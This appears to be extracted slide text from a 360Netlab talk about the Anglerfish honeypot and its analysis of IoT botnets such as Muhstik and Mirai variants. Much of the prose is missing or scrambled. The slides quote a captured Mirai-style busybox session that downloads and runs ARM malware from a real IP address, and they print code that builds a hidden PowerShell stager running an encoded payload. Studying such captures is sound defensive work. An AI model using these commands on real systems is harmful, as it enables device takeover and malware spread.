Anglerfish
 360


yegenshen@360.cn GitHub/Twitter @zom3y3 Network Security Researcher at 360Netlab
TO BE A MALWARE HUNTER!
#Pentest #Botnet #Honeypot

Anglerfish
· TCP/UDPtelnet,ssh,http3050+IoT Fuzz testing
· AnglerfishBotnet360Netlab BlogMiraihttp81 MykingsDDGHajimeTheMoonIoT_reaperSatoriMuhstikHNShttp81 IoT_reaperSatori
· 20dayHuawei HG532 RCE(Satori BotnetCVE-2017-17215) Gpon Home Routers RCE(TheMoon BotnetCVE)



   Anglerfish    Muhstik Botnet  

.
·  · TCP/UDP · IoT · 

SYN Scan
client

server

client

server

Port Closed

Port Open

SYNSYN

First Data
client

server

client

server

client send data first

server send data first

 

TCP Connection
Scanner (client )
socket connect (blocks)
(active open) SYN_SENT

Interactive Data Flow

ESTABLISHED
write read(blocks)
read returns

FIN_WAIT_1 FIN_WAIT_2 TIME_WAIT

Honeypot (server)
socket, bind, listen LISTEN (passive open) accept (blocks)
SYN_RCVD

ESTABLISHED

read returns
write read(blocks)

Simulator


CLOSE_WAIT LAST_ACK
CLOSED

.Anglerfish
·  · Anglerfish · / · Fuzz testing · Anglerfish


· BlackholeGithub · KippoDionaea · PythonGeventServer
REFERENCE [1] https://github.com/dudeintheshell/blackhole [2] https://github.com/DinoTools/dionaea [3] https://github.com/fabio-d/honeypot [4] https://github.com/desaster/kippo

Anglerfish
Anglerfish6ForwarderCoontarckSimulatorAnalysiser DownloaderReporterAnglerfish

/



ftp, ssh, telnet, smtp, http, pop3, imap, https, intel_amt, java rmi, mssql, docker, oreintdb,

mysql, ethman, cisco smi, ethereum, redis, weblogic, jenkins, activemq_web, mctp, apache

couchdb, spark, openfire, elastic search, memcache, mongodb, hadoop_hdfs, hadoop_yarn,

netis /()

RCEBotnet

Docker shell
Linux ShellDockerShell

Docker shell
#!/usr/bin/env python # -*- coding: utf-8 -*# Github/Twitter: @zom3y3 # Email: zom3y3@gmail.com
import docker
def docker_shell(command): '''docker shell''' result = '' if command.strip() == '': return result else: # client = docker.DockerClient(base_url='unix://var/run/docker.sock') client = docker.from_env() command = "/bin/sh -c '" + command + "'" try: container = client.containers.run( "busybox", command, network_disabled=ENABLE_NETWORK, detach=True, auto_remove=True, remove=True) result = container.logs() except Exception as e: print "[+] Error in docker_shell:" + str(e)
telnreteutrn'error' telnetsrvlib + docker_shell telnet
# force to remove container
REFERENCE try: [1] https://blog.fincdomntaaliwnearr.ree.omrogv/e2(0fo1r7c/e0=3T/ru3e0)/the-telnet-honeypot-research-review-and-suggestions-for-application/ [2] https://githuebx.cceopmt /Ezxocemp3tiyo3n/ates len:etsrvlib [3] https://github.cpoasms /docker/docker-py
return result

RSS Feed
Slack APIRSS Feed botexploit-dbsecuriteamtwitter IoTBotnetRCE

Fuzz testing

· TCP SYN Packet

· httpmysqlmssqlredismemcache

· Payload

client

server

client

server

PING

PONG

always answer syn flag

always reply true flag


· /Fuzz testing · Fuzz testing · Fuzz testing

Anglerfish
root admin enable shell sh /bin/busybox iDdosYou /bin/busybox ps; /bin/busybox iDdosYou /bin/busybox cat /proc/mounts; /bin/busybox iDdosYou /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon /bin/busybox echo -e '\x6b\x61\x6d\x69/tmp' > /tmp/.nippon; /bin/busybox cat /tmp/.nippon; /bin/busybox rm /tmp/.nippon /bin/busybox echo -e '\x6b\x61\x6d\x69/overlay' > /overlay/.nippon; /bin/busybox cat /overlay/.nippon; /bin/busybox rm /overlay/.nippon /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
//bbiinn//bbMuussiyyrbbaooxxieecchhoo --ee''\\xx66bb\\xx6611A\\xx66nddg\\xxl66e99//rdsfyesivs//kphetrsn'e>l//ddeebvu/gp'ts>/./nsiypsp/okenr;n/beli/nd/ebbuusygb/.onxipcpaotn/d; /ebvi/np/tbsu/.snyipbpoxonc;a/tb/isny/sbP/kuaesyrynbeloolx/daremdbu/dge/.vn/ipptpso/.nn;ippon  session id /bin/busybox rm /sys/kernel/debug/.nippon
/bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon /bin/busybox iDdosYou cd / /bin/busybox cp /bin/echo ccAD; >ccAD; /bin/busybox chmod 777 ccAD; /bin/busybox iDdosYou /bin/busybox cat /bin/echo /bin/busybox iDdosYou cat /proc/cpuinfo; /bin/busybox iDdosYou /bin/busybox wget; /bin/busybox tftp; /bin/busybox iDdosYou /bin/busybox wget http://172.81.134.239:80/AB4g5/Josho.arm -O - > ccAD; /bin/busybox chmod 777 ccAD; /bin/busybox iDdosYou ./ccAD selfrep.wget; /bin/busybox AndSm0keDoinks /bin/busybox wget; /bin/busybox tftp; /bin/busybox iDdosYou /bin/busybox wget http://172.81.134.239:80/AB4g5/Josho.arm5 -O - > ccAD; /bin/busybox chmod 777 ccAD; /bin/busybox iDdosYou ./ccAD selfrep.wget; /bin/busybox AndSm0keDoinks rm -rf aupnpb; > ccAD; /bin/busybox iDdosYou

Anglerfish

Mirai3sessionsdownloadspayloads 

 sessionsID

session

timestamp

src_ip

src_port dst_ip

0033536614a78c19935bce9e6ec5c699 2018-07-04 21:31:16 172.81.134.239 33714 x.x.x.x

dst_port 23

protocol TCP

 downloadsIDURLmd5

session

url

md5 sha256

0033536614a78c19935bce9e6ec5c699 http://172.81.134.239:80/AB4g5/Josho.mips 1a8...fb9 f0...9f9

file_type ELF ...ped

sucess 1

 payloadspayloadIDpayloadpayload_md5payload_ssdeep

session

payload_md5

0033536614a78c19935bce9e6ec5c699 5921cbc07469f380c69c6ebc70c1bcc6

payload_data BCJ3AQSc...AAA=

payload_ssdeep 48:Xy/7r4F...kBsUJ

.
·  · payload// ·  · 


 http/https  ftp  sftp  nc  echo 16  httpUser-Agent/Query  Shell/VBScript/JScriptURL
...

Payload//
def generate(self): encoded = helpers.deflate(self.psRaw()) payloadCode = "@echo off\n" payloadCode += "if %PROCESSOR_ARCHITECTURE%==x86 (" payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-
Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
payloadCode += ") else (" payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(NewObject IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)
return payloadCode
decompressed = zlib.decompress(base64.b64decode(payload), -15)


 Fuzz testing 


mirai loaderecho binaryelfcpumirai "/bin/busybox cat /bin/echo" mirai

.Muhstik Botnet
· Muhstik Botnet · DrupalGpon · payloadBotnet

Muhstik Botnet
414360NetlabMuhstik Botnet Drupal RCEGpon RCE Muhstik   Drupal  CVE-2018-7600 GPON  ----Muhstik   Muhstik Botnet
Muhstik Botnet11DrupalGpon routers WeblogicWordpressWebdav DasanNetwork SolutionWebuzoClipBucket phpMyadminJbossDD-WRT

Muhstik Botnet

Muhstik Botnet

Muhstik BotnetGpon

Bot 99%Mexico/MX8080Muhstik BotnetPoC

Muhstik BotnetC2

Muhstik Botnet

Muhstik Botnet

Gpon

24000+

Webdav phpMyAdmin Wordpress

5000+ 4000+ 3000+

Webuzo

70+

REFERENCE [1] https://blog.netlab.360.com/botnet-muhstik-is-actively-exploiting-drupal-cve-2018-7600-in-a-worm-style/ [2] https://blog.netlab.360.com/gpon-exploit-in-the-wild-i-muhstik-botnet-among-others/

Drupal
httphttp server web
DrupalDrupal HTTP HeaderDrupal

Gpon
http serverhttp serverHTTP 404 http serverFuzz testinghttp 404 httpHTTP 200
Gpon404Gponweb server GoAhead-Webs

Gpon RCE Payload
522Gpon RCE PayloadssdcGroup ssdeepHighchartsDonut Chart

Gpon RCE Payload
Gpon RCE PayloadGroupssdeepsessionD3.js Force Directed Graph()

Gpon RCE Payload

ssdeepGroup/ssdeeppayload Payload
REFERENCE [1] https://www.virusbulletin.com/virusbulletin/2015/11/optimizing-ssdeep-use-scale/ [2] https://ssdeep-project.github.io/ssdeep/index.html [3] https://github.com/bwall/ssdc [4] https://www.highcharts.com/ [5] https://d3js.org/

Botnet1
higchartssessionuniq_srcipuniq_dstip

Botnet1
port uniq_srcipsession Botnet port

Botnet2
portpayload md5uniq_srcipsession payload md5Botnet payload
BotnetSlack Botnet Alarm 

.
·  · Fuzz testing · 

We Want You

  360 netlab@360.cn

 

